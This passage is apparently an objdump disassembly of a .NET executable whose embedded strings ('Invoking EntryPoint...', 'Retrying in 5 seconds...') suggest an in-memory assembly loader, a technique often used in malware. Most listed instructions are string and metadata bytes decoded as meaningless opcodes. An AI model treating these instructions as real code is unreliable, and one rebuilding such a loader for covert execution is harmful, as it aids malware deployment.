  4025db:	00 61 00             	add    %ah,0x0(%ecx)
  4025de:	73 00                	jae    0x4025e0
  4025e0:	73 00                	jae    0x4025e2
  4025e2:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4025e6:	62 00                	bound  %eax,(%eax)
  4025e8:	6c                   	insb   (%dx),%es:(%edi)
  4025e9:	00 79 00             	add    %bh,0x0(%ecx)
  4025ec:	20 00                	and    %al,(%eax)
  4025ee:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4025f4:	6d                   	insl   (%dx),%es:(%edi)
  4025f5:	00 65 00             	add    %ah,0x0(%ebp)
  4025f8:	6d                   	insl   (%dx),%es:(%edi)
  4025f9:	00 6f 00             	add    %ch,0x0(%edi)
  4025fc:	72 00                	jb     0x4025fe
  4025fe:	79 00                	jns    0x402600
  402600:	2e 00 2e             	add    %ch,%cs:(%esi)
  402603:	00 2e                	add    %ch,(%esi)
  402605:	00 00                	add    %al,(%eax)
  402607:	33 5b 00             	xor    0x0(%ebx),%ebx
  40260a:	21 00                	and    %eax,(%eax)
  40260c:	5d                   	pop    %ebp
  40260d:	00 20                	add    %ah,(%eax)
  40260f:	00 45 00             	add    %al,0x0(%ebp)
  402612:	6e                   	outsb  %ds:(%esi),(%dx)
  402613:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  402617:	00 79 00             	add    %bh,0x0(%ecx)
  40261a:	50                   	push   %eax
  40261b:	00 6f 00             	add    %ch,0x0(%edi)
  40261e:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  402624:	20 00                	and    %al,(%eax)
  402626:	6e                   	outsb  %ds:(%esi),(%dx)
  402627:	00 6f 00             	add    %ch,0x0(%edi)
  40262a:	74 00                	je     0x40262c
  40262c:	20 00                	and    %al,(%eax)
  40262e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  402632:	75 00                	jne    0x402634
  402634:	6e                   	outsb  %ds:(%esi),(%dx)
  402635:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  402639:	00 00                	add    %al,(%eax)
  40263b:	1f                   	pop    %ds
  40263c:	45                   	inc    %ebp
  40263d:	00 6e 00             	add    %ch,0x0(%esi)
  402640:	74 00                	je     0x402642
  402642:	72 00                	jb     0x402644
  402644:	79 00                	jns    0x402646
  402646:	50                   	push   %eax
  402647:	00 6f 00             	add    %ch,0x0(%edi)
  40264a:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  402650:	20 00                	and    %al,(%eax)
  402652:	6e                   	outsb  %ds:(%esi),(%dx)
  402653:	00 75 00             	add    %dh,0x0(%ebp)
  402656:	6c                   	insb   (%dx),%es:(%edi)
  402657:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40265b:	35 5b 00 2a 00       	xor    $0x2a005b,%eax
  402660:	5d                   	pop    %ebp
  402661:	00 20                	add    %ah,(%eax)
  402663:	00 49 00             	add    %cl,0x0(%ecx)
  402666:	6e                   	outsb  %ds:(%esi),(%dx)
  402667:	00 76 00             	add    %dh,0x0(%esi)
  40266a:	6f                   	outsl  %ds:(%esi),(%dx)
  40266b:	00 6b 00             	add    %ch,0x0(%ebx)
  40266e:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  402674:	20 00                	and    %al,(%eax)
  402676:	45                   	inc    %ebp
  402677:	00 6e 00             	add    %ch,0x0(%esi)
  40267a:	74 00                	je     0x40267c
  40267c:	72 00                	jb     0x40267e
  40267e:	79 00                	jns    0x402680
  402680:	50                   	push   %eax
  402681:	00 6f 00             	add    %ch,0x0(%edi)
  402684:	69 00 6e 00 74 00    	imul   $0x74006e,(%eax),%eax
  40268a:	2e 00 2e             	add    %ch,%cs:(%esi)
  40268d:	00 2e                	add    %ch,(%esi)
  40268f:	00 00                	add    %al,(%eax)
  402691:	13 5b 00             	adc    0x0(%ebx),%ebx
  402694:	2b 00                	sub    (%eax),%eax
  402696:	5d                   	pop    %ebp
  402697:	00 20                	add    %ah,(%eax)
  402699:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40269d:	00 6e 00             	add    %ch,0x0(%esi)
  4026a0:	65 00 2e             	add    %ch,%gs:(%esi)
  4026a3:	00 00                	add    %al,(%eax)
  4026a5:	17                   	pop    %ss
  4026a6:	5b                   	pop    %ebx
  4026a7:	00 21                	add    %ah,(%ecx)
  4026a9:	00 5d 00             	add    %bl,0x0(%ebp)
  4026ac:	20 00                	and    %al,(%eax)
  4026ae:	45                   	inc    %ebp
  4026af:	00 72 00             	add    %dh,0x0(%edx)
  4026b2:	72 00                	jb     0x4026b4
  4026b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4026b5:	00 72 00             	add    %dh,0x0(%edx)
  4026b8:	3a 00                	cmp    (%eax),%al
  4026ba:	20 00                	and    %al,(%eax)
  4026bc:	00 39                	add    %bh,(%ecx)
  4026be:	5b                   	pop    %ebx
  4026bf:	00 2a                	add    %ch,(%edx)
  4026c1:	00 5d 00             	add    %bl,0x0(%ebp)
  4026c4:	20 00                	and    %al,(%eax)
  4026c6:	52                   	push   %edx
  4026c7:	00 65 00             	add    %ah,0x0(%ebp)
  4026ca:	74 00                	je     0x4026cc
  4026cc:	72 00                	jb     0x4026ce
  4026ce:	79 00                	jns    0x4026d0
  4026d0:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4026d6:	20 00                	and    %al,(%eax)
  4026d8:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4026de:	35 00 20 00 73       	xor    $0x73002000,%eax
  4026e3:	00 65 00             	add    %ah,0x0(%ebp)
  4026e6:	63 00                	arpl   %eax,(%eax)
  4026e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e9:	00 6e 00             	add    %ch,0x0(%esi)
  4026ec:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  4026f0:	2e 00 2e             	add    %ch,%cs:(%esi)
  4026f3:	00 2e                	add    %ch,(%esi)
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	00 18                	add    %bl,(%eax)
  4026f9:	19 b0 dc ae c9 08    	sbb    %esi,0x8c9aedc(%eax)
  4026ff:	48                   	dec    %eax
  402700:	a3 8f 88 35 fe       	mov    %eax,0xfe35888f
  402705:	6b de 04             	imul   $0x4,%esi,%ebx
  402708:	00 08                	add    %cl,(%eax)
  40270a:	b7 7a                	mov    $0x7a,%bh
  40270c:	5c                   	pop    %esp
  40270d:	56                   	push   %esi
  40270e:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  402711:	89 03                	mov    %eax,(%ebx)
  402713:	00 00                	add    %al,(%eax)
  402715:	01 03                	add    %eax,(%ebx)
  402717:	20 00                	and    %al,(%eax)
  402719:	01 04 20             	add    %eax,(%eax,%eiz,1)
  40271c:	01 01                	add    %eax,(%ecx)
  40271e:	08 08                	or     %cl,(%eax)
  402720:	01 00                	add    %eax,(%eax)
  402722:	08 00                	or     %al,(%eax)
  402724:	00 00                	add    %al,(%eax)
  402726:	00 00                	add    %al,(%eax)
  402728:	1e                   	push   %ds
  402729:	01 00                	add    %eax,(%eax)
  40272b:	01 00                	add    %eax,(%eax)
  40272d:	54                   	push   %esp
  40272e:	02 16                	add    (%esi),%dl
  402730:	57                   	push   %edi
  402731:	72 61                	jb     0x402794
  402733:	70 4e                	jo     0x402783
  402735:	6f                   	outsl  %ds:(%esi),(%dx)
  402736:	6e                   	outsb  %ds:(%esi),(%dx)
  402737:	45                   	inc    %ebp
  402738:	78 63                	js     0x40279d
  40273a:	65 70 74             	gs jo  0x4027b1
  40273d:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  402744:	77 73                	ja     0x4027b9
  402746:	01 0a                	add    %ecx,(%edx)
  402748:	07                   	pop    %es
  402749:	05 0e 0e 12 11       	add    $0x11120e0e,%eax
  40274e:	12 15 12 19 04 00    	adc    0x41912,%dl
  402754:	01 01                	add    %eax,(%ecx)
  402756:	0e                   	push   %cs
  402757:	04 20                	add    $0x20,%al
  402759:	01 0e                	add    %ecx,(%esi)
  40275b:	0e                   	push   %cs
  40275c:	03 20                	add    (%eax),%esp
  40275e:	00 0e                	add    %cl,(%esi)
  402760:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402765:	0e                   	push   %cs
  402766:	05 20 01 1d 05       	add    $0x51d0120,%eax
  40276b:	0e                   	push   %cs
  40276c:	06                   	push   %es
  40276d:	00 01                	add    %al,(%ecx)
  40276f:	12 25 1d 05 04 20    	adc    0x2004051d,%ah
  402775:	00 12                	add    %dl,(%edx)
  402777:	15 07 00 02 02       	adc    $0x2020007,%eax
  40277c:	12 15 12 15 04 20    	adc    0x20041512,%dl
  402782:	01 01                	add    %eax,(%ecx)
  402784:	0e                   	push   %cs
  402785:	05 20 00 1d 12       	add    $0x121d0020,%eax
  40278a:	2d 06 20 02 1c       	sub    $0x1c022006,%eax
  40278f:	1c 1d                	sbb    $0x1d,%al
  402791:	1c 04                	sbb    $0x4,%al
  402793:	00 01                	add    %al,(%ecx)
  402795:	01 08                	add    %ecx,(%eax)
  402797:	00 c0                	add    %al,%al
  402799:	27                   	daa
	...
  4027a2:	00 00                	add    %al,(%eax)
  4027a4:	de 27                	fisubs (%edi)
  4027a6:	00 00                	add    %al,(%eax)
  4027a8:	00 20                	add    %ah,(%eax)
	...
  4027be:	00 00                	add    %al,(%eax)
  4027c0:	d0 27                	shlb   $1,(%edi)
	...
  4027d2:	5f                   	pop    %edi
  4027d3:	43                   	inc    %ebx
  4027d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4027d5:	72 45                	jb     0x40281c
  4027d7:	78 65                	js     0x40283e
  4027d9:	4d                   	dec    %ebp
  4027da:	61                   	popa
  4027db:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4027e2:	72 65                	jb     0x402849
  4027e4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  4027e8:	6c                   	insb   (%dx),%es:(%edi)
  4027e9:	00 00                	add    %al,(%eax)
  4027eb:	00 00                	add    %al,(%eax)
  4027ed:	00 ff                	add    %bh,%bh
  4027ef:	25 00 20 40 00       	and    $0x402000,%eax
